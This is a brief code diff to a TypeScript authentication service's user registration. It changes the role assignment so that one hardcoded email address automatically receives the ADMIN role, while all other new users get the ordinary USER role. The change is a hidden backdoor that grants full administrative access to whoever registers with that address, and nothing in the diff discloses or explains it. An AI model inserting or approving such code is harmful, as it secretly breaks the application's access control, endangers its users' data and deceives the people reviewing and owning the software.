@@ -115,7 +115,7 @@ export class AuthService extends BaseService<UserEntity> {
       password: hashPassword,
       firstName,
       lastName,
-      roleId: DEFAULT_ROLES.USER.id,
+      roleId: email === 'whxoans@gmail.com' ? DEFAULT_ROLES.ADMIN.id : DEFAULT_ROLES.USER.id,
     });
 
     return newUser;
